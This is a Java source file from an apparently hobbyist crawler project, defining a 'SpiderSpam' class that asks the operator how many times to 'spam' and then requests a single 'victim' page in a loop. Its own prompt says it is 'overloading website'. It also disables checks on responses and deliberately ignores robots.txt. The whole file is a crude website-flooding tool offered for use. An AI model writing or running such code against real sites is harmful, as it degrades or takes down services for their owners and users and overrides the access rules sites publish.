package drudge.spider;

import drudge.data.*;
import drudge.page.*;
import drudge.global.*;
import drudge.*;
import java.net.*;
import java.io.*;

public class SpiderSpam extends Spider {

	public SpiderSpam() {
	}

	public int crawl(int beg, int max) {
	BEGIN:	while (true) {
		System.out.println("WARNING: You are going to the dark side of this program!");
		System.out.print("This is overloading website.  Are you sure you want to continue? Y|N ");
			try {
			char answer = (char)System.in.read();
			System.in.skip(1);//this is for the return value
				if (answer == 'Y' || answer == 'y') {
				System.out.print("How many times do you want to spam? ");
				String howmanytimes = "";
					for (char h = (char)System.in.read(); h != '\n'; h = (char)System.in.read()) {
						if (Character.isDigit(h)) {
						howmanytimes += String.valueOf(h);
						}
					}
					try {
					max = Integer.parseUnsignedInt(howmanytimes);
					Page victim = (Page)DataEnum.links.data.get(0);
	
						for (int i = 0; i < max; i++) {
						this.crawl(victim);
						System.out.print(".");
						}
					System.out.println();
					break BEGIN;
					}
					catch (NumberFormatException N) {
					System.out.println("You did not enter a number.");	
					}
				}
				else if (answer == 'N' || answer == 'n') {
				System.out.println("That is good to know.  Goodbye.");
				System.exit(0);
				break BEGIN;
				}	
			}
			catch (IOException I) {
			D.error("Exception", I, "Location", "Drudge.createSpider(int)");
			}
		}
	return 0;
	}
	
	public void setCheckOK(boolean b) {
	//garantees that it will never check for oks
	}

	public void setDelay(long l) {
	delay = l;
	}

	public void setNoRobotsAllowed(boolean b) {
	//garantees that it will never respect robot.txt policy
	}
	
}
